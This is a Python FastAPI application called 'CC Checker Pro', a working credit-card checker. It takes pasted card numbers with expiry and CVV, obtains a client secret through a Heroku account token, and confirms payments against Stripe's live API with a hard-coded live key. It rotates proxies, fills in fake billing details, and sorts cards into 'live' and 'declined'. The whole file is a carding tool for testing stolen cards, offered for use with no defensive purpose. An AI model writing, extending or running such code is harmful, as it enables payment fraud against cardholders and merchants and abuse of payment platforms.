import os
import sys
import uuid
import asyncio
import json
import httpx
from datetime import datetime
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.middleware.cors import CORSMiddleware

# Auto-install required modules
required_modules = ['fastapi', 'httpx', 'uvicorn']
for module in required_modules:
    try:
        __import__(module.replace('-', '_'))
    except ImportError:
        os.system(f"{sys.executable} -m pip install {module}")

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CC Checker Pro</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-color: #6366f1;
            --primary-hover: #4f46e5;
            --success-color: #22c55e;
            --error-color: #ef4444;
            --warning-color: #eab308;
            --background: #f8fafc;
            --card-bg: #ffffff;
            --text: #1e293b;
            --border: #e2e8f0;
            --shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            background: var(--background);
            color: var(--text);
            line-height: 1.6;
            padding: 2rem;
            min-height: 100vh;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: var(--card-bg);
            padding: 2rem;
            border-radius: 1rem;
            box-shadow: var(--shadow);
            border: 1px solid var(--border);
        }

        h1 {
            text-align: center;
            color: var(--primary-color);
            font-size: 2rem;
            margin-bottom: 2rem;
            font-weight: 700;
            letter-spacing: -0.025em;
        }

        .input-group {
            margin-bottom: 1.5rem;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
            color: var(--text);
            font-size: 0.875rem;
        }

        input, textarea {
            width: 100%;
            padding: 0.875rem;
            border: 1px solid var(--border);
            border-radius: 0.75rem;
            font-size: 0.875rem;
            transition: all 0.2s ease;
            background: var(--background);
        }

        input:focus, textarea:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
        }

        textarea {
            min-height: 120px;
            resize: vertical;
            font-family: monospace;
            padding: 1rem;
        }

        .btn-group {
            display: flex;
            gap: 1rem;
            margin-bottom: 1.5rem;
        }

        .btn {
            padding: 0.875rem 1.5rem;
            border: none;
            border-radius: 0.75rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }

        .btn-primary {
            background: var(--primary-color);
            color: white;
        }

        .btn-primary:hover {
            background: var(--primary-hover);
            transform: translateY(-1px);
        }

        .btn-secondary {
            background: #64748b;
            color: white;
        }

        .btn-secondary:hover {
            background: #475569;
        }

        .btn-warning {
            background: var(--warning-color);
            color: white;
        }

        .btn-warning:hover {
            background: #ca8a04;
        }

        .settings-panel {
            display: none;
            background: #f1f5f9;
            padding: 1.5rem;
            border-radius: 0.75rem;
            margin: 1.5rem 0;
            border: 1px solid var(--border);
        }

        .result-card {
            background: var(--card-bg);
            padding: 1.25rem;
            border-radius: 0.75rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--primary-color);
            box-shadow: var(--shadow);
            position: relative;
        }

        .result-card.success {
            border-left-color: var(--success-color);
        }

        .result-card.error {
            border-left-color: var(--error-color);
        }

        .result-status {
            position: absolute;
            right: 1.25rem;
            top: 1.25rem;
            font-weight: 600;
            text-transform: uppercase;
            font-size: 0.75rem;
            letter-spacing: 0.05em;
        }

        .loader {
            display: none;
            text-align: center;
            margin: 2rem 0;
        }

        .loader::after {
            content: '';
            display: inline-block;
            width: 2rem;
            height: 2rem;
            border: 3px solid #f3f3f3;
            border-top: 3px solid var(--primary-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 1.5rem;
            margin-bottom: 1.5rem;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .stats {
            display: flex;
            gap: 1rem;
            margin-bottom: 1.5rem;
        }

        .stat-item {
            flex: 1;
            background: var(--card-bg);
            padding: 1rem;
            border-radius: 0.75rem;
            text-align: center;
            border: 1px solid var(--border);
        }

        .stat-value {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--primary-color);
        }

        .stat-label {
            font-size: 0.75rem;
            color: #64748b;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }

        @media (max-width: 768px) {
            .grid {
                grid-template-columns: 1fr;
            }
            
            .btn-group {
                flex-direction: column;
            }
            
            .stats {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>💳 CC Checker Pro</h1>
        
        <div class="stats">
            <div class="stat-item">
                <div class="stat-value" id="totalCount">0</div>
                <div class="stat-label">Total Checked</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="liveCount">0</div>
                <div class="stat-label">Live Cards</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="declineCount">0</div>
                <div class="stat-label">Declined</div>
            </div>
        </div>

        <div class="input-group">
            <label>Credit Cards (Format: XXXX|MM|YY|CVV)</label>
            <textarea id="ccs" placeholder="Enter cards (one per line)"></textarea>
        </div>

        <div class="btn-group">
            <button class="btn btn-primary" onclick="submitForm()">🚀 Start Checking</button>
            <button class="btn btn-secondary" onclick="toggleSettings()">⚙️ Settings</button>
            <button class="btn btn-warning" onclick="clearNonSuccess()">🧹 Clear Non-Live</button>
        </div>

        <div class="settings-panel" id="settingsForm">
            <div class="grid">
                <div class="input-group">
                    <label>API Key (Required)</label>
                    <input type="text" id="api_key" placeholder="Enter API key" required>
                </div>
                <div class="input-group">
                    <label>Proxy (Optional)</label>
                    <input type="text" id="proxy" placeholder="host:port:user:pass">
                </div>
                <div class="input-group">
                    <label>First Name</label>
                    <input type="text" id="first_name" value="John">
                </div>
                <div class="input-group">
                    <label>Last Name</label>
                    <input type="text" id="last_name" value="Wick">
                </div>
                <div class="input-group">
                    <label>Street Address</label>
                    <input type="text" id="line1" value="2758 Cemetery Street">
                </div>
                <div class="input-group">
                    <label>City</label>
                    <input type="text" id="city" value="New York">
                </div>
                <div class="input-group">
                    <label>State</label>
                    <input type="text" id="state" value="NY">
                </div>
                <div class="input-group">
                    <label>ZIP Code</label>
                    <input type="text" id="postal_code" value="10080">
                </div>
                <div class="input-group">
                    <label>Country</label>
                    <input type="text" id="country" value="US">
                </div>
            </div>
            <button class="btn btn-primary" onclick="saveSettings()">💾 Save Settings</button>
        </div>

        <div class="loader" id="loader"></div>
        <div class="results" id="results"></div>
    </div>

    <script>
        let settings = {};
        let stats = { total: 0, live: 0, decline: 0 };

        function loadSettings() {
            const savedSettings = sessionStorage.getItem('settings');
            if (savedSettings) {
                settings = JSON.parse(savedSettings);
            } else {
                // Set default values
                settings = {
                    api_key: '',
                    proxy: '',
                    first_name: 'John',
                    last_name: 'Wick',
                    line1: '2758 Cemetery Street',
                    city: 'New York',
                    state: 'NY',
                    postal_code: '10080',
                    country: 'US'
                };
                sessionStorage.setItem('settings', JSON.stringify(settings));
            }
            
            // Populate form fields
            for (const [key, value] of Object.entries(settings)) {
                const element = document.getElementById(key);
                if (element) element.value = value;
            }
        }

        function updateStats() {
            document.getElementById('totalCount').textContent = stats.total;
            document.getElementById('liveCount').textContent = stats.live;
            document.getElementById('declineCount').textContent = stats.decline;
        }

        function toggleSettings() {
            const form = document.getElementById('settingsForm');
            form.style.display = form.style.display === 'none' ? 'block' : 'none';
        }

        function saveSettings() {
            settings = {
                api_key: document.getElementById('api_key').value.trim(),
                proxy: document.getElementById('proxy').value.trim(),
                first_name: document.getElementById('first_name').value.trim(),
                last_name: document.getElementById('last_name').value.trim(),
                line1: document.getElementById('line1').value.trim(),
                city: document.getElementById('city').value.trim(),
                state: document.getElementById('state').value.trim(),
                postal_code: document.getElementById('postal_code').value.trim(),
                country: document.getElementById('country').value.trim()
            };

            if (!settings.api_key) {
                alert('API key is required!');
                return;
            }

            sessionStorage.setItem('settings', JSON.stringify(settings));
            alert('Settings saved successfully!');
            toggleSettings();
        }

        function clearNonSuccess() {
            const results = document.querySelectorAll('.result-card');
            results.forEach(result => {
                if (!result.classList.contains('success')) {
                    result.remove();
                }
            });
        }

        function showLoader() {
            document.getElementById('loader').style.display = 'block';
        }

        function hideLoader() {
            document.getElementById('loader').style.display = 'none';
        }

        function addResult(cc, result) {
            stats.total++;
            if (result.status === 'success') stats.live++;
            if (result.status === 'declined') stats.decline++;
            updateStats();

            const resultsDiv = document.getElementById('results');
            const statusClass = result.status === 'success' ? 'success' : 
                              result.status === 'error' ? 'error' : '';
            
            const resultHtml = `
                <div class="result-card ${statusClass}">
                    <div class="result-status">${result.status.toUpperCase()}</div>
                    <strong>CC:</strong> ${cc}<br>
                    <strong>Message:</strong> ${result.message}<br>
                    <small>Checked at: ${result.timestamp}</small>
                </div>
            `;
            resultsDiv.insertAdjacentHTML('afterbegin', resultHtml);
        }

        async function submitForm() {
            const savedSettings = sessionStorage.getItem('settings');
            if (!savedSettings) {
                alert('Please configure settings with API key first!');
                toggleSettings();
                return;
            }

            const settings = JSON.parse(savedSettings);
            if (!settings.api_key) {
                alert('API key is required! Please configure settings.');
                toggleSettings();
                return;
            }

            const ccs = document.getElementById('ccs').value.trim().split('\n').filter(cc => cc.trim());
            if (ccs.length === 0 || ccs.length > 50) {
                alert('Please enter between 1 and 50 credit cards.');
                return;
            }

            showLoader();
            stats = { total: 0, live: 0, decline: 0 };
            updateStats();
            document.getElementById('results').innerHTML = '';

            for (const cc of ccs) {
                try {
                    const response = await fetch('/check_cc', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ cc, settings })
                    });
                    const result = await response.json();
                    addResult(cc, result);
                } catch (error) {
                    addResult(cc, {
                        status: 'error',
                        message: 'Request failed',
                        timestamp: new Date().toLocaleTimeString()
                    });
                }
            }
            hideLoader();
        }

        document.addEventListener('DOMContentLoaded', loadSettings);
    </script>
</body>
</html>
'''

# Backend Logic
async def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

async def make_request(url, method="POST", params=None, headers=None, data=None, json_data=None, proxy=None):
    proxies = None
    if proxy:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            host, port, user, password = proxy_parts
            proxies = {
                "http://": f"http://{user}:{password}@{host}:{port}",
                "https://": f"http://{user}:{password}@{host}:{port}",
            }

    async with httpx.AsyncClient(proxies=proxies) as client:
        try:
            response = await client.request(method, url, params=params, headers=headers, data=data, json=json_data)
            return response.text
        except httpx.RequestError as e:
            print(f"Request error: {e}")
            return None

async def heroku(cc, api_key, proxy=None, first_name=None, last_name=None, line1=None, city=None, state=None, postal_code=None, country=None):
    try:
        cc_data = cc.split("|")
        if len(cc_data) != 4:
            return {"status": "error", "message": "Invalid CC format"}
            
        cc, mon, year, cvv = cc_data
        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())

        headers = {
            "accept": "application/vnd.heroku+json; version=3",
            "accept-language": "en-US,en;q=0.9",
            "authorization": f"Bearer {api_key}",
            "origin": "https://dashboard.heroku.com",
            "user-agent": "Mozilla/5.0",
        }

        url = "https://api.heroku.com/account/payment-method/client-token"
        req = await make_request(url, headers=headers, proxy=proxy)
        
        if not req:
            return {"status": "error", "message": "Failed to get client token"}
            
        client_secret = await parseX(req, '"token":"', '"')

        headers2 = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
        }

        name = f"{first_name} {last_name}" if first_name and last_name else "John Wick"
        data = {
            "type": "card",
            "billing_details[name]": name,
            "billing_details[address][city]": city or "New York",
            "billing_details[address][country]": country or "US",
            "billing_details[address][line1]": line1 or "2758 Cemetery Street",
            "billing_details[address][postal_code]": postal_code or "10080",
            "billing_details[address][state]": state or "NY",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mon,
            "card[exp_year]": year,
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "key": "pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn",
        }

        req2 = await make_request("https://api.stripe.com/v1/payment_methods", headers=headers2, data=data, proxy=proxy)
        if not req2 or "pm_" not in req2:
            return {"status": "error", "message": "Invalid card number"}

        json_sec = json.loads(req2)
        pmid = json_sec["id"]
        piid = client_secret.split("_secret_")[0]

        headers3 = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
        }
        
        data3 = {
            "payment_method": pmid,
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn",
            "client_secret": client_secret,
        }

        req3 = await make_request(f"https://api.stripe.com/v1/payment_intents/{piid}/confirm", headers=headers3, data=data3, proxy=proxy)
        if not req3:
            return {"status": "error", "message": "Failed to confirm payment"}

        ljson = json.loads(req3)
        if '"status": "succeeded"' in req3:
            return {"status": "success", "message": "Payment successful"}
        elif "insufficient_funds" in req3:
            return {"status": "success", "message": "Card Live - Insufficient Funds"}
        elif "decline_code" in req3:
            return {"status": "declined", "message": "Card declined"}
        elif "requires_action" in req3:
            return {"status": "3d_secure", "message": "3D Secure Required"}
        elif "error" in req3:
            return {"status": "error", "message": ljson["error"]["message"]}
        else:
            return {"status": "unknown", "message": "Unknown Response"}

    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    return HTMLResponse(content=HTML_TEMPLATE)

@app.post("/check_cc")
async def check_cc(request: Request):
    try:
        data = await request.json()
        cc = data.get('cc')
        settings = data.get('settings', {})
        
        if not settings.get('api_key'):
            return {
                "status": "error",
                "message": "API key is required",
                "timestamp": datetime.now().strftime('%H:%M:%S')
            }

        result = await heroku(
            cc,
            settings.get('api_key'),
            settings.get('proxy'),
            settings.get('first_name'),
            settings.get('last_name'),
            settings.get('line1'),
            settings.get('city'),
            settings.get('state'),
            settings.get('postal_code'),
            settings.get('country')
        )
        result['timestamp'] = datetime.now().strftime('%H:%M:%S')
        return result
    except Exception as e:
        return {
            "status": "error",
            "message": str(e),
            "timestamp": datetime.now().strftime('%H:%M:%S')
        }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000, reload=True)
